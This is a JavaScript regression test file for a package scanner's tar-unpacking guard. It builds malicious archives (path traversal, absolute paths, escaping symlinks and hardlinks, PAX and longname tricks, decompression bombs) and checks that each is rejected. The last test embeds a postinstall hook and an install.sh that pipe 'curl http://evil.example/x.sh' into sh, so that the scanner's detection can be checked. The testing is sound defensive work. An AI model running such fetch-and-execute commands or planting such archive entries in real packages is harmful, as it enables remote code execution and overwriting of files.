/**
 * #105 回归：解包链路必须拒绝**恶意 tar**——路径穿越 / 绝对路径 / Windows 盘符 /
 * 反斜杠分隔符 / 软硬链接逃逸 / GNU longname·PAX 覆盖 / 解压炸弹。
 *
 * 断言口径：`ok:false` **且原因点名威胁**（不是"吞了个错"），同时确认解包目录外没有
 * 文件被写出；另有正常包（含包内相对软链、合法硬链）必须照常可扫——防"一律拒绝"的假绿。
 *
 * 为什么值得自己校验：过去安全判定完全外包给系统 tar。实测 bsdtar 3.5 会拦 `..` 与软链
 * 穿越，但对**绝对路径只剥掉 `/` 前缀后照常落盘**，且 tar 解包会按 header 声明的体积把字节
 * 全部写盘（`MAX_SCAN_FILE_BYTES` 只管扫描读取）。校验层把这两件事都收进自己手里。
 */
import { afterAll, test } from 'vitest'
import assert from 'node:assert/strict'
import { existsSync, mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { gzipSync } from 'node:zlib'
import tmp from 'tmp'
import { scanTarball } from '../lib/poison.js'
import { dir, entry, gnuLongName, hardlink, pax, symlink, writeTgz } from './lib/tar-craft.mjs'

const tmpDirs = []
function tempDir(prefix = 'dsh-guard-tarsafe-') {
  const created = tmp.dirSync({ prefix, unsafeCleanup: true }).name
  tmpDirs.push(created)
  return created
}
afterAll(() => {
  for (const dir of tmpDirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

/**
 * 造「解包根 / 外部目录」两个位置：恶意 entry 都指向外部目录，扫完断言外部目录**没有**
 * 新文件出现（只看 ok 不够——真正的危害是写到解包目录之外）。
 */
function sandbox() {
  const base = tempDir()
  const outside = join(base, 'outside')
  const scans = join(base, 'scans')
  mkdirSync(outside, { recursive: true })
  mkdirSync(scans, { recursive: true })
  writeFileSync(join(outside, 'probe.txt'), 'ORIGINAL', 'utf8')
  return { base, outside, scans }
}

/**
 * 落盘 .tgz 并扫描；返回 { result, escaped }（escaped = outside 下是否出现新文件）。
 * entries 可以是数组，也可以是「拿到 sandbox 再拼」的函数（绝对路径用例需要真实外部路径）。
 */
async function scan(makeEntries, options = {}) {
  const { outside, scans } = sandbox()
  const entries = typeof makeEntries === 'function' ? makeEntries({ outside, scans }) : makeEntries
  const tarball = writeTgz(join(scans, `evil-${Date.now()}-${Math.random().toString(16).slice(2)}.tgz`), entries)
  const result = await scanTarball(tarball, options)
  const escaped = existsSync(join(outside, 'escaped.txt')) || existsSync(join(outside, 'target'))
  return { result, escaped }
}

/** 断言「拒绝 + 原因点名威胁 + 什么都没写到解包目录外」。 */
async function assertRejected(makeEntries, pattern, options) {
  const { result, escaped } = await scan(makeEntries, options)
  assert.equal(result.ok, false, `必须拒绝；实际 ok:true（findings=${JSON.stringify(result.findings ?? [])}）`)
  assert.match(result.error, /拒绝解包/)
  assert.match(result.error, pattern)
  assert.equal(escaped, false, '解包目录外出现了新文件')
}

// ── 路径类：穿越 / 绝对路径 / 盘符 / 反斜杠 ────────────────────────────────

test('#105 解包前拒绝 `..` 路径穿越的 entry', async () => {
  await assertRejected([entry('../outside/escaped.txt', { data: 'PWNED' })], /路径穿越/)
})

test('#105 解包前拒绝绝对路径 entry（系统 tar 只会剥掉 `/` 前缀后照常落盘）', async () => {
  await assertRejected(({ outside }) => [entry(join(outside, 'escaped.txt'), { data: 'PWNED' })], /绝对路径/)
})

test('#105 解包前拒绝 Windows 盘符与反斜杠分隔符 entry', async () => {
  await assertRejected([entry('C:\\Windows\\escaped.txt', { data: 'PWNED' })], /盘符/)
  await assertRejected([entry('a\\..\\..\\escaped.txt', { data: 'PWNED' })], /反斜杠/)
})

// ── 链接类：符号链接与硬链接目标不得逃逸 ──────────────────────────────────

test('#105 解包前拒绝指向解包目录之外的符号链接（绝对与相对两种写法）', async () => {
  await assertRejected(({ outside }) => [symlink('./link', join(outside, 'target'))], /符号链接目标逃逸/)
  await assertRejected([symlink('./link', '../../outside/target')], /符号链接目标逃逸/)
  // 软链自身合法、但后续 entry 借它穿越：整包拒绝（链接目标 ../.. 已逃逸）
  await assertRejected(
    [symlink('./link', '../../outside'), entry('./link/escaped.txt', { data: 'PWNED' })],
    /符号链接目标逃逸/,
  )
})

test('#105 解包前拒绝逃逸的硬链接目标', async () => {
  await assertRejected([hardlink('./hl', '../../outside/target')], /硬链接目标逃逸/)
})

// ── 元数据类：逃逸路径不得藏在 longname / PAX 里 ───────────────────────────

test('#105 解包前拒绝藏在 GNU longname 里的穿越路径', async () => {
  await assertRejected([gnuLongName('../outside/escaped.txt'), entry('./benign.txt', { data: 'x' })], /路径穿越/)
})

test('#105 解包前拒绝藏在 PAX path 记录里的穿越路径', async () => {
  await assertRejected([pax([['path', '../outside/escaped.txt']]), entry('./benign.txt', { data: 'x' })], /路径穿越/)
})

test('#105 全局 PAX（g）声明同样参与校验，逃逸路径不放过', async () => {
  await assertRejected(
    [pax([['path', '../outside/escaped.txt']], 'g'), entry('./benign.txt', { data: 'x' })],
    /路径穿越/,
  )
})

// ── 体积类：解压炸弹在写盘之前就被挡下 ────────────────────────────────────

test('#105 声明体积超过解包上限即拒绝（不写盘）', async () => {
  await assertRejected([entry('./big.bin', { data: '', size: 4 * 1024 ** 3 })], /超过上限/)
})

test('#105 解包体积上限按声明值生效（上限内正常、超限拒绝）', async () => {
  const bomb = [entry('./package.json', { data: 'x'.repeat(4 * 1024 * 1024) })]
  const { result } = await scan(bomb, { maxUnpackedBytes: 1024 * 1024 })
  assert.equal(result.ok, false, '4 MiB 的包在上限 1 MiB 时必须拒绝')
  assert.match(result.error, /拒绝解包/)
  assert.match(result.error, /超过上限/)
})

test('#105 PAX size 记录同样计入解包上限（头部声明小、记录声明大）', async () => {
  await assertRejected([pax([['size', String(4 * 1024 ** 3)]]), entry('./small.txt', { data: 'x' })], /超过上限/)
})

// ── 结构类：认不出的东西一律 fail-closed ──────────────────────────────────

test('#105 拒绝不支持的 entry 类型（设备节点等）', async () => {
  await assertRejected([entry('./dev', { type: '3' })], /不支持的 tar entry 类型/)
})

test('#105 拒绝空名 entry 与格式非法的 PAX 记录', async () => {
  await assertRejected([entry('', { data: 'x' })], /名为空/)
  await assertRejected(
    [entry('PaxHeaders/x', { type: 'x', data: 'not-a-pax-record\n' }), entry('./y.txt', { data: 'x' })],
    /PAX 记录/,
  )
})

test('#105 拒绝截断的 tar（声明体积大于实际数据）', async () => {
  await assertRejected([entry('./x.txt', { data: 'abc', size: 4096 })], /截断/)
})

test('#105 拒绝 header 校验和不符的 tar（结构非法）', async () => {
  const broken = Buffer.from(entry('./x.txt', { data: 'y' }))
  broken[0] = 0x21 // 改掉名字首字节 → 校验和不符
  const tarball = join(tempDir(), 'broken-checksum.tgz')
  writeFileSync(tarball, gzipSync(broken))
  const result = await scanTarball(tarball)
  assert.equal(result.ok, false)
  assert.match(result.error, /校验和/)
})

// ── 正常包必须照常可扫（含包内软链 / 合法硬链，不得误杀）──────────────────

test('#105 正常包照常解包扫描（包内相对软链与合法硬链不误杀）', async () => {
  const entries = [
    dir('./'),
    dir('./lib/'),
    entry('./package.json', {
      data: JSON.stringify({
        name: 'evil-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
      }),
    }),
    entry('./lib/index.js', { data: 'module.exports = 1\n' }),
    symlink('./lib/link.js', './index.js'),
    hardlink('./lib/hard.js', './lib/index.js'),
    entry('./install.sh', { data: 'curl http://evil.example/x.sh | sh\n' }),
  ]
  const { result } = await scan(entries)
  assert.equal(result.ok, true, result.ok === false ? result.error : '')
  assert.ok(
    result.findings.some((finding) => finding.id === 'suspicious-script'),
    '包内可疑脚本仍被抓到',
  )
})
